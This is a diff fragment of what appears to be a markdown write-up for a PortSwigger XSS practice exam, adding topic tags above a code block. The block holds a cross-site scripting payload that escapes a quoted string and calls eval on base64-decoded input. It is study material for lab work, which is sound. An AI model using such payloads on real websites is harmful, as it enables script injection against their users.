@@ -4,6 +4,8 @@ title: "Practice Exam 2"
 
 # Practice Exam 2
 
+#xss #portswigger #writeup
+
 ```
 x"};eval`atob```//
 ```
